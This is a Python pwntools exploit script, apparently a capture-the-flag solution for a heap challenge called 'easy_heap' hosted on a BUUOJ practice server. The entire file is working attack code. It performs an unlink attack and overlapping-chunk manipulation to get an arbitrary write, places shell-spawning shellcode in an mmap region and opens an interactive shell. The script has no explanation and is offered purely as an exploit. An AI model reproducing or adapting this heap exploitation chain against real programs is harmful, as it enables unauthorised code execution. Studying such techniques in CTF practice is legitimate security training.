# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './easy_heap'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29448'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size):
    cmd(1)
    sla('Size:' , size)
    ru('Address 0x')
    return rint()

def edit(idx , text):
    cmd(3)
    sla('Index:' , idx)
    sla('Content:' , text)

def delete(idx):
    cmd(2)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)

ru('Mmap: 0x')
mmap_addr = rint(10)

addr = add(0x38)
add(0x4f0)
add(0x18)

elf.address = addr - 8 - 0x202060

payload = flat(
    0 , 0x20,
    addr - 0x18 , addr - 0x10,
    0x20 , 0,
    0x30 
)

edit(0 , payload)
delete(1)

# 上面是unlink ,unlink之后随便玩

payload = flat(
    0,0,
    0x60 , addr - 0x8,
)
edit(0 , payload)


add(0x528)
add(0x18)
add(0x418)
add(0x18)

delete(3)

payload = flat(
    0x60 , addr - 0x8,
    0x60 , addr - 0x8 + 0x40,
    0x1000 , 
)

edit(0 , payload)
edit(2 , flat(0 ,0,0, 0x441))

payload = flat(
    0x60 , addr - 0x8,
    0x60 , addr - 0x8 + 0x40,
    0x1000 , 
) + '\xc0'

edit(0 , payload)
# dbg()

delete(2)
edit(1 ,p64(0x20) + '\xc0' )
edit(4 , '\x30')
add(0x18)
add(0x18)

edit(3 , p64(mmap_addr))

payload = flat(
    0x100 , mmap_addr
)

edit(0 , payload)
edit(0 ,  asm(shellcraft.sh()))

cmd(1)
sla('Size:' , 0x20)

# dbg()

p.interactive()

'''
@File    :   easy_heap.py
@Time    :   2021/09/24 16:32:55
@Author  :   Niyah 
'''